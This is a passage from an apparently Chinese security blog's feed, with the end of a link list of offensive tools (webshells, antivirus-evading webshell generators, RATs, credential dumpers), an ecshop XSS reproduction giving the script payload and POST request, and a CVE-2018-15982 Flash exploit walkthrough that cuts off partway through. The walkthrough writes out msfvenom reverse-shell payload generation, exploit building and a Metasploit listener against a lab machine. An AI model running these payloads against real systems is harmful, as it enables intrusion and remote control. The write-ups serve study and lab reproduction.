rel="noopener">https://github.com/Mebus/cupp</a></p></li></ul><h1 id="0x07-抓包改包"><a href="#0x07-抓包改包" class="headerlink" title="0x07 抓包改包"></a>0x07 抓包改包</h1><hr><ul><li><p>Wireshark<br>官网<br><a href="https://www.wireshark.org/" target="_blank" rel="noopener">https://www.wireshark.org/</a></p></li><li><p>burpsuite<br>HackBar plugin for Burpsuite v1.0<br><a href="https://github.com/d3vilbug/HackBar/" target="_blank" rel="noopener">https://github.com/d3vilbug/HackBar/</a></p></li></ul><p>BurpSuite-collections: BurpSuite收集：<br>包括不限于 Burp 文章、破解版、插件(非BApp Store)、汉化等相关教程<br><a href="https://github.com/Mr-xn/BurpSuite-collections" target="_blank" rel="noopener">https://github.com/Mr-xn/BurpSuite-collections</a></p><p>检测和简单利用 java 反序列化漏洞的burpsuite 扩展<br><a href="https://github.com/federicodotta/Java-Deserialization-Scanner/releases" target="_blank" rel="noopener">https://github.com/federicodotta/Java-Deserialization-Scanner/releases</a><br>使用安装<br><a href="https://www.cnblogs.com/beijibing/p/10393516.html" target="_blank" rel="noopener">https://www.cnblogs.com/beijibing/p/10393516.html</a></p><p>burpsuit之J2EE扫描插件<br><a href="https://github.com/ilmila/J2EEScan" target="_blank" rel="noopener">https://github.com/ilmila/J2EEScan</a></p><h1 id="0x08-Bypass"><a href="#0x08-Bypass" class="headerlink" title="0x08 Bypass"></a>0x08 Bypass</h1><hr><ul><li><p>wafw00f，识别和识别保护网站的Web应用程序防火墙（WAF）产品。<br><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p></li><li><p>一款开源WAF<br><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p></li><li><p>自动化绕过WAF脚本<br><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="noopener">https://github.com/khalilbijjou/WAFNinja</a><br><a href="https://github.com/owtf/wafbypasser" target="_blank" rel="noopener">https://github.com/owtf/wafbypasser</a></p></li></ul><h1 id="0x09-注入攻击"><a href="#0x09-注入攻击" class="headerlink" title="0x09 注入攻击"></a>0x09 注入攻击</h1><h2 id="注入教程"><a href="#注入教程" class="headerlink" title="注入教程"></a>注入教程</h2><hr><ul><li><a href="https://www.cnblogs.com/ssooking/p/8137597.html" target="_blank" rel="noopener">SQL注入学习资料总结</a></li></ul><h2 id="注入工具"><a href="#注入工具" class="headerlink" title="注入工具"></a>注入工具</h2><hr><ul><li><p>shack2/SuperSQLInjectionV1<br><a href="https://github.com/shack2/SuperSQLInjectionV1" target="_blank" rel="noopener">https://github.com/shack2/SuperSQLInjectionV1</a></p></li><li><p>一个用于SQL数据库自动注入的Java应用程序。<br><a href="https://github.com/ron190/jsql-injection" target="_blank" rel="noopener">https://github.com/ron190/jsql-injection</a></p></li><li><p>数据库注入工具<br><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p></li><li><p>模板注入工具<br> tplmap: Server-Side Template Injection and Code Injection Detection and Exploitation Tool<br><a href="https://github.com/dylan903/tplmap" target="_blank" rel="noopener">https://github.com/dylan903/tplmap</a></p></li><li><p>自动化SQL注入检查工具<br><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p></li><li><p>web向命令注入检测工具commix<br><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a></p></li><li><p>一个项目中有七种不同的DLL注入技术<br><a href="https://github.com/dylan903/injectAllTheThings" target="_blank" rel="noopener">injectAllTheThings</a> </p></li></ul><h1 id="0x10-webshell"><a href="#0x10-webshell" class="headerlink" title="0x10 webshell"></a>0x10 webshell</h1><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><hr><ul><li>weevely是一款使用python编写的webshell工具(仅限PHP),集webshell生成和连接于一身<br><a href="https://github.com/epinna/weevely3" target="_blank" rel="noopener">https://github.com/epinna/weevely3</a></li></ul><ul><li>Webshell三剑客<br>JSPSPY<br><a href="https://github.com/dylan903/JspSpy.jsp" target="_blank" rel="noopener">https://github.com/dylan903/JspSpy.jsp</a><br>phpspy  Low-overhead sampling profiler for PHP 7<br><a href="https://github.com/adsr/phpspy" target="_blank" rel="noopener">https://github.com/adsr/phpspy</a><br>ASPSPY</li></ul><ul><li><p>b374k<br><a href="https://github.com/dylan903/b374k" target="_blank" rel="noopener">https://github.com/dylan903/b374k</a></p></li><li><p>This is a webshell open source project<br><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p></li><li><p>世界上最好用的php大马<br><a href="https://github.com/Kevil-hui/BestShell" target="_blank" rel="noopener">https://github.com/Kevil-hui/BestShell</a></p></li><li><p>Common php webshells. Do not host the file(s) on your server!<br><a href="https://github.com/JohnTroony/php-webshells" target="_blank" rel="noopener">https://github.com/JohnTroony/php-webshells</a></p></li><li><p>Image Payload Creating/Injecting tools<br><a href="https://github.com/chinarulezzz/pixload" target="_blank" rel="noopener">https://github.com/chinarulezzz/pixload</a></p></li></ul><h2 id="webshell管理工具"><a href="#webshell管理工具" class="headerlink" title="webshell管理工具"></a>webshell管理工具</h2><hr><ul><li>AntSword is a cross-platform website management toolkit.<br><a href="https://github.com/AntSwordProject/AntSword-Loader" target="_blank" rel="noopener">https://github.com/AntSwordProject/AntSword-Loader</a><br><a href="https://github.com/AntSwordProject" target="_blank" rel="noopener">AntSwordProject</a></li></ul><p>免杀webshell无限生成工具蚁剑版<br><a href="https://github.com/yzddmr6/as_webshell_venom" target="_blank" rel="noopener">https://github.com/yzddmr6/as_webshell_venom</a></p><ul><li><p>免杀webshell无限生成工具(利用随机异或无限免杀D盾)<br><a href="https://github.com/yzddmr6/webshell-venom" target="_blank" rel="noopener">https://github.com/yzddmr6/webshell-venom</a></p></li><li><p>Behinder<br><a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder</a></p></li><li><p>基于Cknife的基础进行小幅度修改<br><a href="https://github.com/dylan903/CknifeModifyVersion" target="_blank" rel="noopener">CknifeModifyVersion</a></p></li><li><p>新版中国菜刀<br><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p></li><li><p>Web版中国菜刀<br><a href="https://github.com/imjdl/WCnife" target="_blank" rel="noopener">https://github.com/imjdl/WCnife</a></p></li><li><p>Webshell-Sniper：使用Python编写的基于终端的Webshell管理工具<br><a href="https://github.com/WangYihang/Webshell-Sniper" target="_blank" rel="noopener">https://github.com/WangYihang/Webshell-Sniper</a></p></li><li><p>Platypus: A modern multiple reverse shell sessions manager written in go<br><a href="https://github.com/WangYihang/Platypus" target="_blank" rel="noopener">https://github.com/WangYihang/Platypus</a></p></li></ul><h1 id="0x11-XSS"><a href="#0x11-XSS" class="headerlink" title="0x11 XSS"></a>0x11 XSS</h1><hr><ul><li><p>XSS Payloads：跨站点脚本xss payloads生成器。<br><a href="https://github.com/nettitude/xss_payloads" target="_blank" rel="noopener">https://github.com/nettitude/xss_payloads</a></p></li><li><p>ezXSS：一个xss平台<br><a href="https://github.com/ssl/ezXSS" target="_blank" rel="noopener">https://github.com/ssl/ezXSS</a></p></li><li><p>BlueLotus_XSSReceiver，XSS平台 CTF工具 Web安全工具<br><a href="https://github.com/dylan903/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/dylan903/BlueLotus_XSSReceiver</a></p></li><li><p>ImXSS：Java版开源XSS漏洞测试平台<br><a href="https://gitee.com/coodyer/imxss" target="_blank" rel="noopener">https://gitee.com/coodyer/imxss</a></p></li><li><p>XSSCon：一个简洁高效的XSS扫描工具<br><a href="https://github.com/menkrep1337/XSSCon" target="_blank" rel="noopener">https://github.com/menkrep1337/XSSCon</a></p></li><li><p>B-XSSRF，用于检测和跟踪Blind XSS，XXE和SSRF的工具包<br><a href="https://github.com/SpiderMate/B-XSSRF" target="_blank" rel="noopener">https://github.com/SpiderMate/B-XSSRF</a></p></li><li><p>xssizer：自动化XSS漏洞发现与测试工具。<br><a href="https://github.com/noLogicXD/xssizer" target="_blank" rel="noopener">https://github.com/noLogicXD/xssizer</a></p></li><li><p>xss多功能扫描器<br><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a></p></li><li><p>一款强大的XSS扫描器<br><a href="https://github.com/hahwul/XSpear" target="_blank" rel="noopener">https://github.com/hahwul/XSpear</a></p></li><li><p>XSStrike<br><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike</a></p></li><li><p>XSS与CSRF工具<br><a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a></p></li><li><p>浏览器攻击框架beef<br><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></p></li><li><p>JShell：一个使用XSS获取JavaScript shell的脚本<br><a href="https://github.com/s0md3v/JShell" target="_blank" rel="noopener">https://github.com/s0md3v/JShell</a></p></li><li><p>SSRF检测工具<br>SSRFmap: Automatic SSRF fuzzer and exploitation tool<br><a href="https://github.com/dylan903/SSRFmap" target="_blank" rel="noopener">https://github.com/dylan903/SSRFmap</a></p></li></ul><h1 id="0x12-漏洞利用"><a href="#0x12-漏洞利用" class="headerlink" title="0x12 漏洞利用"></a>0x12 漏洞利用</h1><p><a href="https://dylan903.coding.me/2019/11/20/xue-xi-zong-jie-pian-lou-dong-li-yong/">https://dylan903.coding.me/2019/11/20/xue-xi-zong-jie-pian-lou-dong-li-yong/</a></p><h1 id="0x13-提权维权"><a href="#0x13-提权维权" class="headerlink" title="0x13 提权维权"></a>0x13 提权维权</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><hr><ul><li><p>CVE-2015-2426 EXP (windows内核提权)<br><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="noopener">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p></li><li><p>Common Windows Misconfiguration: Services<br><a href="https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html" target="_blank" rel="noopener">windows配置错误导致权限提升</a></p></li><li><p>Evil-WinRM：用于渗透测试的终极Windows远程管理shell<br><a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">https://github.com/Hackplayers/evil-winrm</a></p></li></ul><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><hr><ul><li>linux sudo 提权漏洞(CVE-2019-14287)复现<br><a href="https://dylan903.coding.me/2019/10/15/linux-sudo-root-quan-xian-rao-guo-lou-dong-cve-2019-14287-fu-xian/">https://dylan903.coding.me/2019/10/15/linux-sudo-root-quan-xian-rao-guo-lou-dong-cve-2019-14287-fu-xian/</a></li></ul><h2 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h2><hr><ul><li><p>phpsploit一款隐蔽的后门交互shell工具<br><a href="https://github.com/nil0x42/phpsploit" target="_blank" rel="noopener">https://github.com/nil0x42/phpsploit</a></p></li><li><p>ATT&amp;CK之后门持久化<br><a href="https://attack.mitre.org/" target="_blank" rel="noopener">ATT&amp;CK</a><br><a href="https://www.freebuf.com/articles/system/210910.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/210910.html</a></p></li></ul><h1 id="0x14-内网渗透"><a href="#0x14-内网渗透" class="headerlink" title="0x14 内网渗透"></a>0x14 内网渗透</h1><h2 id="渗透教程"><a href="#渗透教程" class="headerlink" title="渗透教程"></a>渗透教程</h2><hr><ul><li><p>2018年初整理的一些内网渗透TIPS<br><a href="https://github.com/dylan903/Intranet_Penetration_Tips" target="_blank" rel="noopener">Intranet_Penetration_Tips</a> </p></li><li><p>内网渗透命令大全<br><a href="https://www.yuag.org/内网渗透命令大全.html" target="_blank" rel="noopener">https://www.yuag.org/内网渗透命令大全.html</a></p></li><li><p>域渗透-域内信息收集<br><a href="https://uknowsec.cn/posts/notes/域渗透-域内信息收集.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/域渗透-域内信息收集.html</a></p></li><li><p>Darth Sidious - DarthSidious<br><a href="https://hunter2.gitbook.io/darthsidious/" target="_blank" rel="noopener">https://hunter2.gitbook.io/darthsidious/</a></p></li><li><p>从零开始内网渗透学习<br><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p></li></ul><h2 id="端口转发与代理工具"><a href="#端口转发与代理工具" class="headerlink" title="端口转发与代理工具"></a>端口转发与代理工具</h2><p>RootKiter’s Blog<br><a href="http://rootkiter.com/" target="_blank" rel="noopener">http://rootkiter.com/</a></p><p>内网渗透之端口转发与代理工具总结 - FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/articles/web/170970.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/170970.html</a></p><h3 id="一、LCX"><a href="#一、LCX" class="headerlink" title="一、LCX"></a>一、LCX</h3><h3 id="二、nc-反弹"><a href="#二、nc-反弹" class="headerlink" title="二、nc 反弹"></a>二、nc 反弹</h3><h3 id="三、socks代理工具"><a href="#三、socks代理工具" class="headerlink" title="三、socks代理工具"></a>三、socks代理工具</h3><ul><li><p>1）EW（EarthWorm）<br><a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/</a></p></li><li><p>2）Termite 是EW（EarthWorm）的最新版，官方链接： <a href="http://rootkiter.com/Termite/" target="_blank" rel="noopener">http://rootkiter.com/Termite/</a><br>主要特性： 多平台支持、跳板机互联、正反向级联、小巧无依赖、内置Shell令主机管理更方便</p></li><li><p>3）reGeorg   工具地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p></li><li><p>4）sSocks 工具地址： <a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener">http://sourceforge.net/projects/ssocks/</a></p></li><li><p>5）proxychains 工具地址址：<a href="http://proxychains.sourceforge.net/" target="_blank" rel="noopener">http://proxychains.sourceforge.net/</a></p></li><li><p>6）Tunna 工具地址： <a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">https://github.com/SECFORCE/Tunna</a></p></li></ul><h3 id="四、frp-内网穿透利器"><a href="#四、frp-内网穿透利器" class="headerlink" title="四、frp 内网穿透利器"></a>四、frp 内网穿透利器</h3><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议。</p><p>工具地址： <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p><h3 id="五、ngrok-内网穿透"><a href="#五、ngrok-内网穿透" class="headerlink" title="五、ngrok 内网穿透"></a>五、ngrok 内网穿透</h3><p>ngrok支持Windows、Linux、Mac OS X等多个平台，可自行选择需要的版本来下载使用<br>工具地址： <a href="https://ngrok.com/download" target="_blank" rel="noopener">https://ngrok.com/download</a></p><h3 id="六、其它"><a href="#六、其它" class="headerlink" title="六、其它"></a>六、其它</h3><p>tgcd - TCP/IP Gender Changer Daemon<br><a href="http://tgcd.sourceforge.net/" target="_blank" rel="noopener">http://tgcd.sourceforge.net/</a></p><h2 id="Windows工具"><a href="#Windows工具" class="headerlink" title="Windows工具"></a>Windows工具</h2><hr><ul><li><p>Ophcrack：基于彩虹表的Windows密码破解器<br><a href="http://ophcrack.sourceforge.net/" target="_blank" rel="noopener">http://ophcrack.sourceforge.net/</a></p></li><li><p>LaZagne：用于检索存储在本地计算机上的帐户密码的开源程序。<br><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p></li><li><p>mimikatz<br><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p></li></ul><h1 id="0x15-代码审计"><a href="#0x15-代码审计" class="headerlink" title="0x15 代码审计"></a>0x15 代码审计</h1><hr><ul><li><p>php代码审计工具<br><a href="https://github.com/pwnsdx/BadCode" target="_blank" rel="noopener">https://github.com/pwnsdx/BadCode</a></p></li><li><p>自动化代码审计工具cobra<br><a href="https://github.com/wufeifei/cobra" target="_blank" rel="noopener">https://github.com/wufeifei/cobra</a></p></li><li><p>cobra: Source Code Security Audit (源代码安全审计)<br><a href="https://github.com/WhaleShark-Team/cobra" target="_blank" rel="noopener">https://github.com/WhaleShark-Team/cobra</a></p></li></ul><h1 id="0x16-其他工具"><a href="#0x16-其他工具" class="headerlink" title="0x16 其他工具"></a>0x16 其他工具</h1><h2 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h2><hr><ul><li><p>Proxy：golang实现的高性能http,https,websocket,tcp,udp,socks5,ss代理服务器,支持正向代理、反向代理、透明代理、内网穿透、TCP/UDP端口映射、SSH中转、TLS加密传输、协议转换、防污染DNS代理。<br><a href="https://github.com/snail007/goproxy" target="_blank" rel="noopener">https://github.com/snail007/goproxy</a></p></li><li><p>nps：一款轻量级、功能强大的内网穿透反向代理工具。<br><a href="https://github.com/cnlh/nps" target="_blank" rel="noopener">https://github.com/cnlh/nps</a></p></li><li><p>TOR Router：该工具允许您将Tor设置为默认网关，并在Tor（透明代理）下发送所有Internet连接，以提高隐私/匿名性。<br><a href="https://github.com/Edu4rdSHL/tor-router" target="_blank" rel="noopener">https://github.com/Edu4rdSHL/tor-router</a></p></li><li><p>mitmproxy：支持SSL的中间人HTTP代理<br><a href="https://github.com/mitmproxy/mitmproxy/" target="_blank" rel="noopener">https://github.com/mitmproxy/mitmproxy/</a></p></li><li><p>setup-ipsec-vpn: Scripts to build your own IPsec VPN server,<br>with IPsec/L2TP and Cisco IPsec on Ubuntu, Debian and CentOS<br><a href="https://github.com/hwdsl2/setup-ipsec-vpn" target="_blank" rel="noopener">https://github.com/hwdsl2/setup-ipsec-vpn</a></p></li><li><p>SwitchyOmega<br><a href="https://github.com/FelisCatus/SwitchyOmega" target="_blank" rel="noopener">https://github.com/FelisCatus/SwitchyOmega</a></p></li><li><p>gfwlist<br><a href="https://github.com/gfwlist/gfwlist" target="_blank" rel="noopener">https://github.com/gfwlist/gfwlist</a></p></li><li><p>Venom: Venom - A Multi-hop Proxy for Penetration Testers<br><a href="https://github.com/Dliv3/Venom" target="_blank" rel="noopener">https://github.com/Dliv3/Venom</a></p></li><li><p>Scripts to build your own IPsec VPN server, with IPsec/L2TP and Cisco IPsec on Ubuntu, Debian and CentOS<br><a href="https://github.com/dylan903/setup-ipsec-vpn" target="_blank" rel="noopener">setup-ipsec-vpn</a></p></li><li><p>Web代理<br><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="noopener">https://github.com/zt2/sqli-hunter</a></p></li><li><p>ShadowsockR<br><a href="https://github.com/sklun/ShadowsockR" target="_blank" rel="noopener">https://github.com/sklun/ShadowsockR</a></p></li><li><p>shadowsocks-heroku: 一键部署 Free Shadowsocks-Heroku<br><a href="https://github.com/makedefenxiang/shadowsocks-heroku" target="_blank" rel="noopener">https://github.com/makedefenxiang/shadowsocks-heroku</a></p></li></ul><h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><hr><ul><li><p>quasar: Quasar Framework - Build high-performance VueJS user interfaces in record time<br><a href="https://github.com/quasarframework/quasar/tree/3aa266595b07054910978d01160c0c3c6834ffd1" target="_blank" rel="noopener">https://github.com/quasarframework/quasar/tree/3aa266595b07054910978d01160c0c3c6834ffd1</a></p></li><li><p>SimpleRemoter: 基于gh0st的远程控制器<br><a href="https://github.com/yuanyuanxiang/SimpleRemoter" target="_blank" rel="noopener">https://github.com/yuanyuanxiang/SimpleRemoter</a></p></li><li><p>Lime-RAT: LimeRAT | Simple, yet powerful remote administration tool for Windows (RAT)<br><a href="https://github.com/NYAN-x-CAT/Lime-RAT" target="_blank" rel="noopener">https://github.com/NYAN-x-CAT/Lime-RAT</a></p></li><li><p>Stitch: Python Remote Administration Tool (RAT)<br><a href="https://github.com/nathanlopez/Stitch" target="_blank" rel="noopener">https://github.com/nathanlopez/Stitch</a></p></li><li><p>Koadic C3 COM Command &amp; Control - JScript RAT(基于Python C2服务器来实现)<br><a href="https://github.com/zerosum0x0/koadic" target="_blank" rel="noopener">https://github.com/zerosum0x0/koadic</a></p></li><li><p>P2P内网穿透，实现【公司】-【家】远程控制<br><a href="https://github.com/bobowire/Wireboy.Socket.P2PSocket" target="_blank" rel="noopener">https://github.com/bobowire/Wireboy.Socket.P2PSocket</a></p></li><li><p>An evil RAT (Remote Administration Tool) for macOS / OS X.<br><a href="https://github.com/Marten4n6/EvilOSX" target="_blank" rel="noopener">https://github.com/Marten4n6/EvilOSX</a></p></li><li><p>android屏幕共享及远程控制<br><a href="https://github.com/android-notes/androidScreenShareAndControl" target="_blank" rel="noopener">https://github.com/android-notes/androidScreenShareAndControl</a></p></li></ul><h2 id="无线攻击"><a href="#无线攻击" class="headerlink" title="无线攻击"></a>无线攻击</h2><hr><ul><li><p>Ehtools：是一个功能强大的Wi-Fi渗透工具框架<br><a href="https://github.com/entynetproject/ehtools" target="_blank" rel="noopener">https://github.com/entynetproject/ehtools</a></p></li><li><p>atear：无线黑客攻击、WiFi安全、漏洞分析仪、Pentenstration。<br><a href="https://github.com/NORMA-Inc/AtEar" target="_blank" rel="noopener">https://github.com/NORMA-Inc/AtEar</a></p></li></ul><h2 id="Terminal"><a href="#Terminal" class="headerlink" title="Terminal"></a>Terminal</h2><hr><ul><li><p>hyper：A terminal built on web technologies<br><a href="https://github.com/zeit/hyper" target="_blank" rel="noopener">https://github.com/zeit/hyper</a></p></li><li><p>yperpwn：A hyper plugin to provide a flexible GDB GUI with the help of GEF, pwndbg or peda<br><a href="https://github.com/bet4it/hyperpwn" target="_blank" rel="noopener">https://github.com/bet4it/hyperpwn</a></p></li></ul><h2 id="堡垒机项目"><a href="#堡垒机项目" class="headerlink" title="堡垒机项目"></a>堡垒机项目</h2><hr><ul><li>APubPlat：一款开源堡垒机项目，Devops自动化部署、堡垒机开源项目、Web Terminal<br><a href="https://github.com/wangweianger/APubPlat" target="_blank" rel="noopener">https://github.com/wangweianger/APubPlat</a></li></ul><h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><hr><ul><li><p>通过部分评估实现高级JavaScript解密反混淆工具。<br><a href="https://github.com/mindedsecurity/JStillery" target="_blank" rel="noopener">https://github.com/mindedsecurity/JStillery</a></p></li><li><p>apache日志分析器<br><a href="https://github.com/mthbernardes/ARTLAS" target="_blank" rel="noopener">https://github.com/mthbernardes/ARTLAS</a></p></li><li><p>http命令行客户端<br><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="noopener">https://github.com/jkbrzt/httpie</a></p></li><li><p>浏览器攻击框架<br><a href="https://github.com/julienbedard/browsersploit" target="_blank" rel="noopener">https://github.com/julienbedard/browsersploit</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> summary </tag>
            
            <tag> 资源整理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ecshop XSS 复现</title>
      <link href="/2019/08/17/ecshop-xss-fu-xian/"/>
      <url>/2019/08/17/ecshop-xss-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>使用Chrome调试XSS漏洞，需要关闭XSS过滤器,才能成功弹窗</p><p><code>&quot;C:\Program Files (x86)\Google\Chrome\Application\chrome.exe&quot; --args --disable-xss-auditor</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191008215335.png" alt></p><h1 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h1><p>本地搭建ECShop v2.7.2 ，php版本5.3及以下，否则会报各种各样的错</p><p>访问<code>http://192.168.1.6/article_cat.php?id=1</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191008220513.png" alt></p><p>搜索框输入<code>1\\\&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;</code>提交，成功弹窗</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191008220738.png" alt></p><p>burpsuite抓包POST提交，记得添加</p><p><code>Content-Type: application/x-www-form-urlencoded</code></p><p><code>keywords=1234567\\\&quot;&gt;&lt;script&gt;alert(123456)&lt;/script&gt;&amp;id=1&amp;cur_url=http://127.0.0.1/article_cat.php?id=1</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191008220925.png" alt></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>这里总结一下常用POST请求类型</p><ul><li>raw 原始类型，可以上传任意格式的文本，比如 text、json、xml、html</li></ul><pre><code>该编码类型的表单，必须通过AJAX技术JSON: application/jsonXML: text/xml纯文本: text/plainhtml: text/html</code></pre><ul><li>application/x-www-form-urlencoded，会将表单内的数据转换拼接成 key-value 对（非 ASCII 码进行编码）<br>URLencoded: application/x-www-form-urlencoded</li></ul><pre><code>HTML中&lt;form&gt;标签的enctype属性用来指定表单编码格式，默认为application/x-www-form-urlencoded请求头:（这里只给出了Content-Type字段）：POST http://www.example.com HTTP/1.1Content-Type: application/x-www-form-urlencoded</code></pre><ul><li>multipart/form-data，将表单的数据处理为一条消息，以标签为单元，用分隔符分开。既可以上传键值对，也可以上传文件</li></ul><pre><code>请求头：POST http://www.example.com HTTP/1.1Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/shiyuqing1207/article/details/46430017" target="_blank" rel="noopener">关闭谷歌chrome xss过滤器</a><br><a href="https://blog.csdn.net/jesse_cool/article/details/86608816" target="_blank" rel="noopener">http 请求头的几种Content-type</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> XSS </tag>
            
            <tag> ecshop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-15982任意代码执行漏洞复现</title>
      <link href="/2019/08/08/cve-2018-15982-ren-yi-dai-ma-zhi-xing-lou-dong-fu-xian/"/>
      <url>/2019/08/08/cve-2018-15982-ren-yi-dai-ma-zhi-xing-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>2018年11月29日，360高级威胁应对团队在全球范围内第一时间发现一起针对俄罗斯的APT攻击行动，通过一份俄文内容的医院员工问卷文档，携带最新的Flash 0day漏洞和具有自毁功能的专属木马程序，该漏洞（CVE-2018-15982）允许攻击者恶意制作的Flash对象在受害者的计算机上执行代码，从而获取对系统命令行的访问权限。</p><hr><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><ul><li>AdobeFlash Player &lt;= 31.0.0.153</li><li>AdobeFlash Player Installer&lt;= 31.0.0.108<br>（不包括AdobeFlash Player 32.0.0.101、AdobeFlash Player Installer 31.0.0.122）</li></ul><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击机：Linux kali (192.168.159.136)<br>靶机：windows7 x64（192.168.159.133）<br>Flash版本: Adobe Flash Player ActiveX_29.0.0.155<br>链接: <a href="https://pan.baidu.com/s/1S5hbsREkhWv_b1zyn-rQUg" target="_blank" rel="noopener">Adobe Flash Player ActiveX_29.0.0.155</a><br>提取码: c8sf<br>(注意：断网安装)</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p><strong>kali:</strong></p><p><strong>git 漏洞POC</strong><br><code>git clone https://github.com/Ridter/CVE-2018-15982_EXP</code></p><p>msfvenom生成两个payload程序（32位和64位）<br><code>msfvenom -p windows/meterpreter/reverse_tcp_rc4 RC4PASSWORD=ZALE LPORT=4444 LHOST=192.168.159.136 -f raw &gt; 86.bin</code></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp_rc4 RC4PASSWORD=ZALE LPORT=4444 LHOST=192.168.159.136 -f raw &gt; 64.bin</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808144511.png" alt></p><p><strong>生成POC</strong><br>将生成的两个<code>.bin</code>文件copy进下载的POC文件夹，<br>并cd进去，执行.py文件生成POC</p><pre><code>cp *.bin CVE-2018-15982_EXP/cd CVE-2018-15982_EXP/python CVE_2018_15982.py -i 86.bin -I 64.bin</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808144751.png" alt></p><p>开启apache服务，并将生成的两个文件copy进html目录</p><pre><code>systemctl start apache2.servicecp index.html /var/www/htmlcp exploit.swf /var/www/html</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145202.png" alt></p><p><strong>设置msf监听</strong></p><p>启动msf</p><p><code>msfconsole</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145436.png" alt></p><pre><code>use exploit/multi/handler set payload windows/meterpreter/reverse_tcp_rc4set lport 4444set lhost 192.168.159.136set RC4PASSWORD zaleexploit</code></pre><p><img 